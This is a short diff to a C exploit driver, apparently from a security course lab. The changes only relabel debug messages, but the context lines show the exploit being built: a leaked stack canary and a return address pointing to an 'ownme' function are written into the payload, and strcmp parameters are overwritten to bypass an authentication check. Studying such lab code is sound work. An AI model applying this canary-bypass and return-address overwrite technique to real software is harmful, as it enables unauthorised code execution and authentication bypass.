@@ -33,7 +33,7 @@ int from_child, to_child;
 void print_escaped(FILE *fp, const char* buf, unsigned len) {
    int i;
    int l=-3;
-   fprintf(stderr, "\n"); // empty line
+   fprintf(stderr, "\n%4d:", 0); // empty line
    for (i=0; i < len; i++) {
       if(i%4==2 && i%16==2)
          fprintf(stderr, "\n%4d:", l+=4);
@@ -175,7 +175,7 @@ int main(int argc, char* argv[]) {
    // 3-2. Inject canary and RA
    expl[auth_user_auth_canary_loc_diff/sizeof(void*)] = canary;
    expl[auth_user_auth_ra_loc_diff/sizeof(void*)] = ownme_addr;
-   fprintf(stderr, "driver: Setting values at offset: 0x%x 0x%x\n", 
+   fprintf(stderr, "driver: Inject canary/RA    : Setting values at offset: 0x%x 0x%x\n", 
       auth_user_auth_canary_loc_diff/sizeof(void*), 
       auth_user_auth_ra_loc_diff/sizeof(void*));
 
@@ -186,7 +186,7 @@ int main(int argc, char* argv[]) {
    expl[offset_auth_l2_loc/sizeof(void*)] = 0; // no length comparison in strcmp
    expl[offset_auth_user2_loc/sizeof(void*)] = main_loop_bp;
    expl[offset_auth_pass2_loc/sizeof(void*)] = main_loop_bp;
-   fprintf(stderr, "driver: Setting values at offset: 0x%x\n", 
+   fprintf(stderr, "driver: Inject strcmp params: Setting values at offset: 0x%x\n", 
       offset_auth_l2_loc/sizeof(void*));
 
    // 4. Send the payload
